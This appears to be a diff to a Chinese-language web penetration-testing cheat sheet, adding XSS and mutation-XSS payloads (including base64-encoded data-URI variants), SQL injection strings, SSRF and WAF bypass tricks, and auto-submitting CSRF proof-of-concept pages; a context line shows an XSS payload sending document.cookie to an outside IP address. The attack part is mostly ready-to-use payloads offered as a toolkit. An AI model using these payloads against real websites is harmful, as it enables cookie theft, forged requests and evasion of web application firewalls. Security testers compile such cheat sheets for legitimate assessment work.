@@ -6,7 +6,6 @@
 - 编码：如十六进制编码、URL编码、HTML实体编码等
 - 空白符替换：`%09`、`%0a`、`%0d`、内联注释符`/**/`、分隔符`${IFS}`等
 - 关键字替换：如`phtml`代替`php`、`&&`代替`and`、`||`代替`or`等
-
 - 某些情况下可以添加额外的字符而不影响程序执行结果：如首尾的空格、`.`、`/.`、`ca\t`、`c'a't`等
 - 双写：如`pphphp`、`<scr<script>ipt>`等
 - 程序缺陷：如两次URL编码`%252f`、SQL注释`-#- #`等
@@ -33,6 +32,52 @@ xhr.send();
 
 ```HTML
 <script>new Image().src='http://10.26.14.222:7331/?c='+document.cookie;</script>
+```
+
+```html
+<ScRIpt>prompt`3334444`</sCriPT>
+
+<iframe src="data:text/html;base64,PG9iamVjdCBkYXRhPWRhdGE6dGV4dC9odG1sO2Jhc2U2NCxQSE5qY21sd2RENXdjbTl0Y0hSZ016TXpORFEwTkdBOEwzTmpjbWx3ZEQ0PT48L29iamVjdD4="></iframe>
+
+<object data="data:text/html;base64,PHNjcmlwdD5wcm9tcHRgMzMzNDQ0NGA8L3NjcmlwdD4="></object>
+
+"-prompt`3334444`-"
+
+<style><a alt="</style><img src=x onerror=alert(1)>">
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<svg><style><img src=x onerror=alert(1)>
+<math><p></p><style><!--</style><img src/onerror=alert(1)>--></style></math>
+<!--a foo=--!><img src=x onerror=alert(1)><!--<a>">
+<![CDATA[<math><img src=x onerror=alert(1)>]]>
+```
+
+### mXSS
+
+```html
+<p>test
+<p>test</p>
+
+<a alt=test>xxx</a>
+<a alt="test">xxx</a>
+
+<table><a>
+<a></a><table></table>
+```
+
+```html
+<style><a alt="</style><img src=x onerror=alert(1)>">
+
+<style>
+    <a alt="
+</style>
+<img src="x" onerror="alert(1)">"&gt;
+
+
+<noscript><style></noscript><img src=x onerror="alert(1)">
+
+<noscript>
+    #text: <style>
+<img src="x" onerror="alert(1)">
 ```
 
 ## 文件上传
@@ -379,6 +424,9 @@ http://10.0.0.1:7331/l33t.txt
 http://10.0.0.1:7331/l33t.txt?foo=bar
 ```
 
+- 绕过方式
+IP地址转换、结合URL重定向、短网址绕过等
+
 ## SQL注入
 
 - 直接注入（整数类） `UNION SELECT`
@@ -441,8 +489,6 @@ print(res)
 ```
 
 注意：每个参数都要尝试、每个请求都要尝试、每个注入点都要尝试。
-
-
 
 - 常用MySQL语句
 
@@ -510,6 +556,13 @@ updatexml(1,concat(0x7e,(select database()),0x7e),1)
 %a1
 ```
 
+
+```
+'AND'a'='a
+"&&"a"="a
+```
+
+- `order by` 后的注入
 
 ## 命令注入
 
@@ -945,3 +998,66 @@ findstr /s /i /c:"key" *
 # 默认当前目录 需要指定目录的话
 # cd <ROOT_PATH> & <CMD>
 ```
+
+## CSRF
+
+基本CSRF
+
+```html
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>CSRF PoC</h1>
+    <form method="POST" action="https://example.com/api/xxx">
+      <input type="hidden" name="email" value="user@example.com">
+      <input type="submit" value="Submit Request">
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+JSON格式CSRF 尝试text/plain是否可以成功请求
+
+```html
+<!DOCTYPE html>
+<html>
+  <body>
+    <form action="https://example.com/api/xxx" method="POST" enctype="text/plain">
+      <input type="hidden" name='{"test":"x' value='y","email":"user@example.com"}'/>
+      <input type="submit" value="Submit request"/>
+    </form>
+    <script>history.pushState('','','/');document.forms[0].submit();</script>
+  </body>
+</html>
+```
+
+Refer置空
+
+```html
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="referrer" content="no-referrer">
+  </head>
+  <body>
+    <form action="https://example.com/api/xxx" method="POST" enctype="text/plain">
+      <input type="hidden" name='{"test":"x' value='y","email":"user@example.com"}'/>
+      <input type="submit" value="Submit request"/>
+    </form>
+    <script>history.pushState('','','/hello');document.forms[0].submit();</script>
+  </body>
+</html>
+```
+
+
+## WAF
+
+- 请求真实ip绕过waf：部分waf部署架构的特性，部分waf并不是直接串在目标站点线路上，而是通过DNS解析的形式部署，此时可以先探测到目标站点的真实ip，直接请求ip以此绕过waf的检测。
+- 检测内容范围绕过：waf性能限制，检测特定内容前几k或几十k的内容，然后在此特定内容段内填充无用数据，payload放于无用数据后，以此绕过检测
+- 编码、大小写、双写、内联注释等
+- 分块传输
